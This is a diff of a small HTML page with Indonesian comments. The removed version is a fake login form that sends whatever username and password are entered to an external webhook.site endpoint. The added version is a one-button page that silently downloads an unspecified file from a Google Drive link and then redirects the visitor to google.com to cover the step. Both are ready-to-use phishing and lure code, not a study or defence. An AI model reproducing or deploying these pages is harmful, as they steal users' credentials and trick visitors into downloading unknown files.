@@ -1,50 +1,42 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>Webhook Login TEST</title>
+  <meta charset="utf-8">
+  <style>
+    .button {
+      background-color: #4CAF50;
+      border: none;
+      color: white;
+      padding: 15px 32px;
+      text-align: center;
+      font-size: 16px;
+      margin: 4px 2px;
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
 
-<h2>Login (Webhook POC)</h2>
-
-<input id="username" placeholder="username"><br><br>
-<input id="password" type="password" placeholder="password"><br><br>
-
-<button onclick="send()">LOGIN & KIRIM</button>
-
-<p id="status"></p>
-
 <script>
-const WEBHOOK_URL = "https://webhook.site/9dfc474f-69b4-4a66-8ec1-066d18bb7084";
+function a() {
 
-function send() {
-  const username = document.getElementById("username").value;
-  const password = document.getElementById("password").value;
+  // Trigger download terlebih dahulu
+  var link = document.createElement('a');
+  link.href = 'https://drive.usercontent.google.com/download?id=1y2piqYUHSSrcHOCKaQy5EQbDb1IrX5Sh&export=download&authuser=0&confirm=t&uuid=5bdc824e-e9f2-4d16-b944-03088f37c506&at=AGN2oQ1FlDA48w-_QaRH1LvALFFA:1773898570212';
+  document.body.appendChild(link);
+  link.click();
+  document.body.removeChild(link);
 
-  if (!username || !password) {
-    alert("Username dan password wajib diisi");
-    return;
-  }
-
-  const data = {
-    username: username,
-    password: password,   // ⚠️ POC ONLY
-    action: "login",
-    time: new Date().toISOString(),
-    page: window.location.href
-  };
-
-  fetch(WEBHOOK_URL, {
-    method: "POST",
-    mode: "no-cors",   // 🔥 bikin request PASTI terkirim
-    body: JSON.stringify(data)
-  });
-
-  document.getElementById("status").innerText =
-    "✅ LOGIN DIKIRIM. CEK WEBHOOK.SITE!";
+  // Redirect setelah download mulai (delay kecil)
+  setTimeout(function () {
+    window.location.href = "https://google.com";
+  }, 320); // 0.8 detik
 }
 </script>
+
+<center>
+  <input type="button" class="button" value="Download From  Site" onclick="a()">
+</center>
 
 </body>
 </html>
